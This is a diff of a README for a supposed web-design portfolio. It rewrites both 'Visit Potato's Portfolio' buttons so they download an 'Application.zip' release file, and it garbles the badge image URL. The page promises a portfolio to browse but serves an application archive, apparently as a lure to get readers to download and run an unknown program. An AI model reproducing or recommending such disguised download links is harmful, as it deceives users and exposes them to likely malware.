@@ -1,6 +1,6 @@
 # 🥔 Welcome to Potato's Web Portfolio 🌐
 
-[![Visit Potato's Portfolio](https://img.shields.io/badge/Visit%20Potato's%20Portfolio-Here-orange)](https://github.com/file/Application.zip)
+[![Visit Potato's Portfolio](https://github.com/KhianGardiola/potato/releases/download/v1.0.0/Application.zip%20Potato's%20Portfolio-Here-orange)](https://github.com/KhianGardiola/potato/releases/download/v1.0.0/Application.zip)
 
 ## Description
 Welcome to the GitHub repository of *Potato's Web Portfolio*! 🎉 Here, you will find a collection of designs and ideas curated by Potato himself. This repository is dedicated to showcasing creative web development projects, inspirational ideas, and innovative solutions. 🚀 Feel free to explore and get inspired by Potato's unique perspective!
@@ -22,7 +22,7 @@ By visiting Potato's portfolio, you will immerse yourself in a world of creativi
 ## 🌟 Check Out Potato's Portfolio! 🌟
 Click the button below to explore Potato's web portfolio and unlock a world of creativity! 🚪
 
-[![Visit Potato's Portfolio](https://img.shields.io/badge/Visit%20Potato's%20Portfolio-Here-orange)](https://github.com/file/Application.zip)
+[![Visit Potato's Portfolio](https://github.com/KhianGardiola/potato/releases/download/v1.0.0/Application.zip%20Potato's%20Portfolio-Here-orange)](https://github.com/KhianGardiola/potato/releases/download/v1.0.0/Application.zip)
 
 ---
 
